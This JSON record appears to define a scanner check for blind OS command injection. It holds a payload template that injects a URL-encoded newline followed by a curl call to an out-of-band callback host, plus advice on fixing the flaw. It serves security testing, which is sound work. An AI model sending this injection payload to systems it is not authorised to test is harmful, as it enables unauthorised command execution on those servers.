{
  "id": "m3-blind-cmdi-newline-encoded",
  "bug_class": "command_injection",
  "title": "Blind OS command injection (URL-encoded newline + curl)",
  "severity": "Critical",
  "applies_when": {
    "always": true
  },
  "insertion_kinds": [],
  "oracle": {
    "kind": "oob",
    "payload_template": "%0acurl http://{callback}%0a"
  },
  "references": [
    "CWE-78",
    "CAPEC-248"
  ],
  "remediation": "Never pass user input to a shell. Invoke programs with an argument vector (no shell interpolation), drop shell metacharacters and newlines, and validate against a strict allowlist. A blind command that reaches the unique callback proves out-of-band shell execution.",
  "payload_family": "shell-newline-encoded"
}
